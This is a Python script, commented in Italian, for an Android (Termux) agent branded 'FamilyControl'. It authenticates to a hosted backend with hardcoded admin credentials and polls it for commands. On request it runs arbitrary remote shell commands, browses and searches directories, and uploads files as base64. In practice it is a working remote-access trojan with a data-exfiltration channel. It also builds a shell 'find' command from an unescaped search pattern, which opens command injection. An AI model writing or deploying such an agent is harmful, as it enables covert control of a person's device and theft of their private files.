#!/usr/bin/env python3
"""
FamilyControl Agent Android (Termux) - Modalità On-Demand
NON invia dati automaticamente - Risponde SOLO ai comandi ricevuti
"""

import os
import json
import time
import subprocess
import requests
import base64
import shutil
from datetime import datetime

# ==================== CONFIGURAZIONE ====================
BACKEND_URL = "https://familycontrol-backend-production.up.railway.app"
USERNAME = "admin"
PASSWORD = "admin123"

# ID dispositivo
try:
    DEVICE_ID = subprocess.check_output(['getprop', 'ro.serialno']).decode().strip()
    if not DEVICE_ID or DEVICE_ID == "unknown":
        DEVICE_ID = subprocess.check_output(['getprop', 'net.hostname']).decode().strip()
except:
    DEVICE_ID = "android_termux"

if not DEVICE_ID or DEVICE_ID == "unknown":
    DEVICE_ID = "android_termux"

DEVICE_NAME = f"Android_{DEVICE_ID[:8]}"
DEVICE_TYPE = "android"

# Cartella base per i file (usa la home di Termux - sempre accessibile)
HOME = os.path.expanduser("~")
DOWNLOAD_BASE = os.path.join(HOME, "familycontrol_files")
os.makedirs(DOWNLOAD_BASE, exist_ok=True)

# ==================== FUNZIONI BASE ====================

def get_token():
    """Ottiene token JWT dal backend"""
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/auth/login",
            json={"username": USERNAME, "password": PASSWORD},
            timeout=10
        )
        if response.status_code == 200:
            return response.json().get("token")
        return None
    except Exception as e:
        print(f"  ❌ Errore login: {e}")
        return None

def send_command_result(token, command_id, result):
    """Invia risultato comando al backend"""
    try:
        requests.patch(
            f"{BACKEND_URL}/api/commands/{command_id}",
            headers={"Authorization": f"Bearer {token}"},
            json={"status": "completed", "result": result},
            timeout=30
        )
        return True
    except Exception as e:
        print(f"  ❌ Errore invio risultato: {e}")
        return False

def send_data(token, data_type, data_content):
    """Invia dati generici al backend"""
    try:
        requests.post(
            f"{BACKEND_URL}/api/devices/{DEVICE_ID}/data",
            headers={"Authorization": f"Bearer {token}"},
            json={"dataType": data_type, "dataContent": data_content},
            timeout=30
        )
        return True
    except Exception as e:
        print(f"  ❌ Errore invio dati: {e}")
        return False

def execute_shell_command(command):
    """Esegue un comando shell e restituisce output"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"error": "Comando timeout (60s)"}
    except Exception as e:
        return {"error": str(e)}

# ==================== COMANDI ON-DEMAND ====================

def handle_shell_command(params):
    """Esegue comando shell remoto"""
    cmd = params.get("command", "")
    if not cmd:
        return {"error": "Nessun comando specificato"}
    return execute_shell_command(cmd)

def handle_list_directory(params):
    """Lista il contenuto di una directory"""
    path = params.get("path", HOME)
    
    try:
        if not os.path.exists(path):
            return {"error": f"Percorso non esiste: {path}"}
        
        if not os.access(path, os.R_OK):
            return {"error": f"Permesso negato: {path}"}
        
        items = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            items.append({
                "name": item,
                "type": "directory" if os.path.isdir(full_path) else "file",
                "size": os.path.getsize(full_path) if os.path.isfile(full_path) else None,
                "modified": datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat()
            })
        
        return {
            "path": path,
            "items": items[:100],  # Limita a 100 item
            "count": len(items)
        }
    except Exception as e:
        return {"error": str(e)}

def handle_download_file(params):
    """Scarica un file e lo invia in base64"""
    file_path = params.get("file_path")
    
    if not file_path:
        return {"error": "Nessun file specificato"}
    
    if not os.path.exists(file_path):
        return {"error": f"File non trovato: {file_path}"}
    
    # Limite 5MB per non appesantire
    file_size = os.path.getsize(file_path)
    if file_size > 5 * 1024 * 1024:
        return {"error": f"File troppo grande: {file_size / 1024 / 1024:.1f}MB > 5MB"}
    
    try:
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        file_b64 = base64.b64encode(file_content).decode()
        
        # Salva una copia locale
        dest_path = os.path.join(DOWNLOAD_BASE, os.path.basename(file_path))
        shutil.copy2(file_path, dest_path)
        
        return {
            "status": "success",
            "file_name": os.path.basename(file_path),
            "file_size": file_size,
            "size_kb": round(file_size / 1024, 2),
            "file_base64": file_b64,
            "saved_to": dest_path
        }
    except Exception as e:
        return {"error": str(e)}

def handle_search_files(params):
    """Cerca file per nome nella home di Termux"""
    pattern = params.get("pattern", "")
    max_results = params.get("max_results", 50)
    
    if not pattern:
        return {"error": "Nessun pattern di ricerca specificato"}
    
    results = []
    try:
        cmd = f"find {HOME} -type f -name '*{pattern}*' 2>/dev/null | head -n {max_results}"
        output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        
        for line in output.stdout.strip().split('\n'):
            if line:
                results.append(line)
        
        return {
            "pattern": pattern,
            "search_path": HOME,
            "results": results,
            "count": len(results)
        }
    except Exception as e:
        return {"error": str(e)}

def handle_get_device_info():
    """Info del dispositivo"""
    try:
        return {
            "device_id": DEVICE_ID,
            "name": DEVICE_NAME,
            "type": DEVICE_TYPE,
            "home": HOME,
            "download_folder": DOWNLOAD_BASE,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {"error": str(e)}

def handle_get_files_list():
    """Lista dei file scaricati localmente"""
    try:
        files = []
        for f in os.listdir(DOWNLOAD_BASE):
            f_path = os.path.join(DOWNLOAD_BASE, f)
            files.append({
                "name": f,
                "size": os.path.getsize(f_path),
                "modified": datetime.fromtimestamp(os.path.getmtime(f_path)).isoformat()
            })
        return {
            "folder": DOWNLOAD_BASE,
            "files": files,
            "count": len(files)
        }
    except Exception as e:
        return {"error": str(e)}

# ==================== COMANDI MAPPING ====================

COMMAND_HANDLERS = {
    "shell": handle_shell_command,
    "exec": handle_shell_command,
    "cmd": handle_shell_command,
    "ls": handle_list_directory,
    "dir": handle_list_directory,
    "list": handle_list_directory,
    "download": handle_download_file,
    "get_file": handle_download_file,
    "search": handle_search_files,
    "find": handle_search_files,
    "info": handle_get_device_info,
    "device_info": handle_get_device_info,
    "files": handle_get_files_list,
    "myfiles": handle_get_files_list,
}

# ==================== MAIN LOOP ====================

def main():
    print("""
╔════════════════════════════════════════════════════════════════╗
║     FamilyControl Agent - MODALITÀ ON-DEMAND                  ║
║                                                                ║
║     ✅ Risponde SOLO ai comandi ricevuti                      ║
║     ✅ Accesso shell remoto                                    ║
║     ✅ Download file in base64                                 ║
║     ✅ Cerca file nella home di Termux                         ║
╚════════════════════════════════════════════════════════════════╝
    """)
    
    print(f"📱 Dispositivo: {DEVICE_NAME}")
    print(f"🆔 ID: {DEVICE_ID}")
    print(f"📡 Backend: {BACKEND_URL}")
    print(f"📁 Cartella: {DOWNLOAD_BASE}")
    print(f"🏠 Home: {HOME}")
    print("\n⏳ In attesa di comandi...\n")
    
    token = get_token()
    if not token:
        print("❌ Login fallito. Verifica credenziali e backend.")
        print(f"   Backend URL: {BACKEND_URL}")
        print(f"   Username: {USERNAME}")
        return
    
    print("✅ Autenticato al backend")
    
    # Invia info dispositivo iniziale (una sola volta)
    device_info = handle_get_device_info()
    send_data(token, "device_info", device_info)
    
    last_commands = {}
    
    try:
        while True:
            try:
                # Controlla comandi pendenti
                response = requests.get(
                    f"{BACKEND_URL}/api/devices/{DEVICE_ID}/commands",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10
                )
                
                if response.status_code == 200:
                    commands = response.json()
                    
                    for cmd in commands:
                        cmd_id = cmd.get('id')
                        command = cmd.get('command')
                        params = cmd.get('params', {})
                        
                        # Evita di rieseguire lo stesso comando
                        if last_commands.get(cmd_id) == command:
                            continue
                        
                        print(f"\n📡 [{datetime.now().strftime('%H:%M:%S')}] Comando: {command}")
                        
                        # Trova l'handler
                        handler = COMMAND_HANDLERS.get(command.lower())
                        
                        if handler:
                            # Esegui il comando
                            result = handler(params)
                            print(f"   ✅ Risultato ricevuto")
                            
                            # Invia risultato
                            send_command_result(token, cmd_id, result)
                            last_commands[cmd_id] = command
                        else:
                            error_result = {"error": f"Comando sconosciuto: {command}"}
                            send_command_result(token, cmd_id, error_result)
                            print(f"   ❌ Comando sconosciuto")
                
                time.sleep(5)  # Controlla ogni 5 secondi
                
            except requests.exceptions.ConnectionError:
                print(f"⚠️ [{datetime.now().strftime('%H:%M:%S')}] Backend non raggiungibile, riprovo...")
                time.sleep(10)
                token = get_token()
            except Exception as e:
                print(f"⚠️ Errore: {e}")
                time.sleep(5)
                
    except KeyboardInterrupt:
        print("\n\n⏹️ Agent fermato manualmente")
        print("👋 Arrivederci!")

if __name__ == "__main__":
    main()
